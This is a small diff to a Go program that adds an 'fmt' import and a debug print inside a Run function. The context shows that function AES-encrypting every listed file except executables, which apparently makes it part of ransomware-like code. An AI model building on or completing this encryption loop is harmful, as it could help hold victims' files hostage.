@@ -12,6 +12,7 @@ import (
 	"encoding/base64"
 	"encoding/pem"
 	"errors"
+	"fmt"
 	"os"
 	"path/filepath"
 )
@@ -269,6 +270,7 @@ func Run(filename []string) {
 
 	for _, _file := range filename {
 		fileType := fileAnalysis.GetFileType(_file)
+		fmt.Println(_file, fileType)
 		if fileType != "exe" {
 			AesEncryptFile(_file, key)
 		}
